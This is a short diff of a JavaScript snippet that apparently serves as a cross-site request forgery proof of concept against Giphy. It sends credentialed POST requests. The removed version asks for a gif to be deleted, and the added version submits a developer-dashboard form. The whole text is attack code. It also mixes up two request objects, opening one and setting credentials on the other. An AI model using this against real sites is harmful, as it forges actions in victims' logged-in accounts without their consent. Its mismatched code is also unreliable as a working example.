@@ -1,7 +1,7 @@
 var http = new XMLHttpRequest();
 var xhr = new XMLHttpRequest();
-var url = 'https://www.giphy.com/ajax/gif/update';
-var params = 'gif_id=dk8319804f0G5hbENe&key=delete_gif&value=true';
+var url = 'https://devportal-new.giphy.com/dashboard/';
+var params = 'description=hellomoto&name=hihihi&&name=ok&terms=true';
 http.open('POST', url, true);
 xhr.withCredentials = true;
 
